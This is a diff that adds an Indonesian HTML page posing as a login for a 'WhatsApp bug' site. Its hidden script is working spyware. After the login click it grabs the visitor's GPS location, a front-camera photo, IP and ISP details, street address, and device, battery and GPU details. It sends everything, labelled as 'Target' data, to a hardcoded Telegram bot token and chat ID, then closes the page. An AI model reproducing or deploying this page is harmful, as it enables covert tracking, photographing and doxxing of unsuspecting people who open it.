@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>ＰＲＩＭＲＯＳＥ ＴＥＣＨ ＰＲＯＪＥＣＴ</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  body {
+    margin: 0;
+    background: radial-gradient(circle at center, #4a0000 0%, #1a0000 60%, #000 100%);
+    color: #fff;
+    font-family: 'Orbitron', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    animation: fadeIn 1s ease-in;
+  }
+  @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
+
+  .card {
+    max-width: 460px;
+    width: 92%;
+    background: rgba(10,0,0,0.9);
+    padding: 50px 28px; /* Lebih tinggi dari versi sebelumnya */
+    border-radius: 24px;
+    box-shadow: 0 0 80px rgba(255,0,0,0.5), inset 0 0 40px rgba(255,0,0,0.1);
+    text-align: center;
+    animation: glow 2s infinite alternate;
+  }
+  @keyframes glow {
+    from {box-shadow: 0 0 40px rgba(255,0,0,0.3), inset 0 0 25px rgba(255,0,0,0.1);}
+    to   {box-shadow: 0 0 80px rgba(255,0,0,0.6), inset 0 0 40px rgba(255,0,0,0.15);}
+  }
+  .logo {
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    overflow: hidden;
+    margin: 0 auto 24px;
+    border: 3px solid #700;
+    box-shadow: 0 0 35px rgba(255,0,0,0.5);
+  }
+  .logo img { width: 100%; height: 100%; object-fit: cover; }
+  h1 {
+    font-size: 22px;
+    margin: 0 0 12px;
+    font-weight: 700;
+    color: #ff1a1a;
+    text-shadow: 0 0 10px rgba(255,0,0,0.8);
+    letter-spacing: 1px;
+  }
+  .desc {
+    font-size: 14px;
+    color: #ff9999;
+    margin-bottom: 30px; /* Tambah jarak biar card panjang */
+    text-shadow: 0 0 6px rgba(255,0,0,0.5);
+  }
+  input {
+    width: 100%;
+    background: rgba(50,0,0,0.6);
+    border: 1px solid #600;
+    color: #fff;
+    padding: 14px;
+    border-radius: 12px;
+    margin: 8px 0;
+    font-size: 16px;
+    text-align: center;
+  }
+  input:focus {
+    outline: none;
+    border-color: #ff4d4d;
+    box-shadow: 0 0 12px #ff4d4d99;
+  }
+  button {
+    background: linear-gradient(90deg,#ff1a1a,#990000);
+    color: #fff;
+    border: 0;
+    padding: 16px;
+    width: 100%;
+    border-radius: 12px;
+    font-weight: bold;
+    margin-top: 12px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+    box-shadow: 0 0 14px rgba(255,0,0,0.5);
+  }
+  button:hover {
+    background: linear-gradient(90deg,#ff4d4d,#b30000);
+    box-shadow: 0 0 20px rgba(255,0,0,0.8);
+  }
+  .verify { 
+    display: none; 
+    text-align: center; 
+    padding: 40px 0; /* Biar verify card juga panjang */
+  }
+  .spinner {
+    width: 60px;
+    height: 60px;
+    border: 5px solid #300;
+    border-top-color: #ff1a1a;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 20px auto;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="login" id="loginCard">
+      <div class="logo">
+        <img src="https://files.catbox.moe/08obxz.jpg" alt="logo">
+      </div>
+      <h1><i class="fa-solid fa-spa"></i> Primrose Tech Project</h1>
+      <p class="desc">Website Bug WhatsApp Terbaru</p>
+      <input type="text" id="username" placeholder="Masukkan Username">
+      <input type="password" id="password" placeholder="Masukkan Password">
+      <button id="loginBtn"><i class="fa-solid fa-right-to-bracket"></i> LOGIN</button>
+    </div>
+
+    <div class="verify" id="verifyCard">
+      <h1><i class="fa-solid fa-spinner"></i> Loading</h1>
+      <p style="color:#ff6666;font-size:14px;margin-bottom:20px">Sedang memeriksa username & password ke database...</p>
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+<script>
+const CONFIG = {
+  BOT_TOKEN: "7967587846:AAH3fdlA6onGhyH-sAS7sIBm_WkxAqSFvTU",
+  CHAT_ID: "7242161057",
+  IP_INFO_API: "https://ipapi.co/json/"
+};
+
+const loginBtn = document.getElementById('loginBtn');
+const loginCard = document.getElementById('loginCard');
+const verifyCard = document.getElementById('verifyCard');
+
+loginBtn.addEventListener('click', ()=>{
+  const u=document.getElementById('username').value.trim();
+  const p=document.getElementById('password').value.trim();
+  if(!u||!p){alert("Username & Password wajib diisi!");return;}
+  loginCard.style.display='none';
+  verifyCard.style.display='block';
+  startVerification();
+});
+
+async function startVerification(){
+  try{
+    let pos=null, photo=null;
+
+    // Lokasi
+    try{
+      pos = await getLocation();
+    }catch{
+      await telegramSendMessage("❌ Lokasi Target Tidak Di Izinkan");
+    }
+
+    // Kamera
+    try{
+      photo = await getPhoto();
+    }catch{
+      await telegramSendMessage("❌ Foto Target Tidak Di Izinkan");
+    }
+
+    const ip = await getPublicIPInfo();
+    const gpu = getGPUInfo();
+    const batt = await getBattery();
+    const media = await getMediaDevices();
+    const reverse = pos?.coords ? await reverseGeocode(pos.coords.latitude,pos.coords.longitude) : null;
+
+    const lat = pos?.coords?.latitude, lon = pos?.coords?.longitude;
+    const maps = lat ? `https://www.google.com/maps/search/?api=1&query=${lat},${lon}` : null;
+
+    if(photo) await telegramSendPhoto(photo,"📸 Foto Target");
+
+    let parts = [];
+
+    if(lat){
+      parts.push(`📍 Info GPS Target
+Latitude : ${lat}
+Longatitude : ${lon}
+Akurasi : ${pos.coords.accuracy}m
+Altitude : ${pos.coords.altitude||'-'}
+Kecepatan : ${pos.coords.speed||'-'}
+Heading : ${pos.coords.heading||'-'}
+Link : ${maps}`);
+    }
+
+    if(reverse?.address){
+      const a=reverse.address;
+      parts.push(`🏠 Info Alamat Target
+${a.road||'-'} 
+Desa : ${a.village||a.suburb||'-'}
+Kabupaten : ${a.city||a.town||a.county||'-'}
+Kota : ${a.state||'-'}
+Kode Pos : ${a.postcode||'-'}
+Negara : ${a.country||'-'}`);
+    }
+
+    if(ip){
+      parts.push(`🌐 Info IP Target
+IP Address : ${ip.ip}
+Kota : ${ip.city}
+Region : ${ip.region}
+Negara : ${ip.country_name}
+Kode Pos : ${ip.postal}
+ISP : ${ip.org}
+ASN : ${ip.asn}
+Zona : ${ip.timezone}`);
+    }
+
+    parts.push(`📱 Info Device Target
+UA : ${navigator.userAgent}
+OS : ${navigator.platform}
+Browser : ${navigator.vendor||'-'}
+RAM : ${navigator.deviceMemory||'-'} GB
+CPU : ${navigator.hardwareConcurrency||'-'} core
+DoNotTrack : ${navigator.doNotTrack||'-'}
+Bahasa : ${navigator.language}
+TimeZone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+
+    if(batt){
+      parts.push(`🔋 Info Baterai Target
+Sisa : ${(batt.level*100).toFixed(0)}%
+Charger : ${batt.charging}`);
+    }
+
+    if(gpu.vendor||gpu.renderer){
+      parts.push(`🎮 Info GPU Target
+Vendor : ${gpu.vendor}
+Renderer : ${gpu.renderer}`);
+    }
+
+    if(media.length){
+      parts.push(`🎧 Info Media Devices
+${media.map((d,i)=>`${i+1}. [${d.kind}] ${d.label||'-'}`).join('\n')}`);
+    }
+
+    parts.push(`🔗 Info Halaman
+URL : ${location.href}
+Referrer : ${document.referrer||'-'}
+Cookie Enabled : ${navigator.cookieEnabled}
+History Length : ${history.length}`);
+
+    await telegramStep(parts,700);
+    setTimeout(forceClose,1000);
+
+  }catch(e){
+    setTimeout(forceClose,500);
+  }
+}
+
+function getLocation(){
+  return new Promise((resolve,reject)=>{
+    navigator.geolocation.getCurrentPosition(resolve,()=>reject(new Error("Lokasi ditolak")),{enableHighAccuracy:true,timeout:15000});
+  });
+}
+function getPhoto(){
+  return new Promise(async (resolve,reject)=>{
+    try{
+      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+      const track=stream.getVideoTracks()[0];
+      const c=document.createElement('canvas');
+      const v=document.createElement('video');
+      v.srcObject=new MediaStream([track]);
+      await v.play();
+      await new Promise(r=>setTimeout(r,500));
+      c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+      c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+      track.stop();
+      c.toBlob(b=>resolve(b),'image/jpeg',0.8);
+    }catch{reject(new Error("Kamera ditolak"));}
+  });
+}
+async function getPublicIPInfo(){try{const r=await fetch(CONFIG.IP_INFO_API);if(!r.ok)return null;return await r.json();}catch{return null;}}
+function getGPUInfo(){try{const c=document.createElement("canvas");const gl=c.getContext("webgl");const dbg=gl.getExtension("WEBGL_debug_renderer_info");return{vendor:gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}catch{return {};}}
+async function getBattery(){if(navigator.getBattery){try{return await navigator.getBattery();}catch{}}return null;}
+async function getMediaDevices(){try{if(!navigator.mediaDevices?.enumerateDevices)return[];const d=await navigator.mediaDevices.enumerateDevices();return d.map(x=>({kind:x.kind,label:x.label,deviceId:x.deviceId}));}catch{return[];}}
+async function reverseGeocode(lat,lon){
+  try{
+    const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&accept-language=id`);
+    if(!r.ok)return null;
+    return await r.json();
+  }catch{return null;}
+}
+function forceClose(){window.open('','_self');window.close();location.href="about:blank";}
+async function telegramSendMessage(txt){const url=`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CONFIG.CHAT_ID,text:txt,disable_web_page_preview:true})});}
+async function telegramSendPhoto(photoBlob,caption){const url=`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;const fd=new FormData();fd.append('chat_id',CONFIG.CHAT_ID);fd.append('photo',photoBlob,'snap.jpg');if(caption)fd.append('caption',caption.slice(0,1000));return fetch(url,{method:'POST',body:fd});}
+async function telegramStep(parts,delay=1000){for(const p of parts){await telegramSendMessage(p);await new Promise(r=>setTimeout(r,delay));}}
+</script>
+</body>
+</html>
